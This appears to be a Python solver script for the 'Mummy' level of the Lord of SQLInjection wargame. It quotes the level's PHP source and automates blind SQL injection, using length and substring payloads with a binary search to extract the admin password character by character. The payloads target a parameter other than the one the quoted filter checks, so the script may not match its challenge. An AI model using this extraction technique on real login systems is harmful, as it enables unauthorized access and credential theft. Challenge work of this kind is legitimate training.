#!/usr/bin/env python3
import los


def check_func(*args) -> bool:
    '''
    check string in response of request
    args[0]: response
    '''
    return 'login success!' in args[0]


def main():
    '''
    Mummy 44

    if(preg_match('/master|sys|information|;|\(|\//i', $_GET['query'])) exit("No Hack ~_~");
    for($i=0;$i<strlen($_GET['query']);$i++) if(ord($_GET['query'][$i]) <= 32) exit("%01~%20 can used as whitespace at mssql");
    $query = "select".$_GET['query'];
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    $result = sqlsrv_fetch_array(sqlsrv_query($db,$query));
    if($result[0]) echo "<h2>Hello anonymous</h2>";

    $query = "select pw from prob_mummy where id='admin'";
    $result = sqlsrv_fetch_array(sqlsrv_query($db,$query));
    if($result['pw'] === $_GET['pw']) solve("mummy");
    '''

    url = "https://los.rubiya.kr/chall/mummy_2e13c2a4483d845ce2d37f7c910f0f83.php"
    cook = los.check_cookies(url)

    param = dict(pw="' or length(pw)>%s-- ")
    len_of_key = los.find_key_len(url, param, check_func, cook)

    print(len_of_key)

    result = ''
    num_of_requests = 0
    for i in range(1, len_of_key + 1):
        param = dict(pw=f"' or unicode(substr(pw,{i},1))<%s-- ")
        left, num_requests = los.find_binary(url, param, check_func,
                                             32, 127, cook)
        print(chr(left))
        result += chr(left)
        num_of_requests += num_requests

    print('num_of_requests:', num_of_requests)

    param = dict(pw=result)
    response = los.get_request(url, param, cook)

    if 'Clear!' in response:
        print('Mummy Clear!')


if __name__ == '__main__':
    main()
